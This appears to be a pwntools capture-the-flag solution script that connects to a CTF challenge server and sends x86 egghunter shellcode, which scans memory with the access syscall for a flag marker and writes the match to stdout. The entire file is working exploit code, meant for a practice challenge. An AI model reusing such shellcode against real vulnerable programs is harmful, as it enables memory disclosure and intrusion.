from pwn import *

io = process("./main")
io = remote("01.linux.challenges.ctf.thefewchosen.com", 49163)
io.clean()

io.sendline(asm("""
_start:
    push 0x3c
    pop ebx
    push 0x1b
    pop eax
    int 0x80

    mov edi, 0x43434654
    mov esi, 0x427b4654
    mov edx, 0x5FFFFFFF

next_page:
    or dx, 0xfff

next_address:
    add edx, 1
    push eax
    push ecx
    push edx
    push ebx
    push esi
    push edi
    xor ecx, ecx
    lea ebx, [edx + 0x4]
    mov al, 0x21
    int 0x80

    cmp al, 0xf2
    pop edi
    pop esi
    pop ebx
    pop edx
    pop ecx
    pop eax
    jz next_page

    cmp [edx], edi
    jnz next_address
    cmp [edx + 4], esi
    jnz next_address
    mov ecx, edx
    push 0x24
    pop edx
    push 0x1
    pop ebx
    mov al, 0x4
    int 0x80
    jmp next_address
"""))

io.interactive()
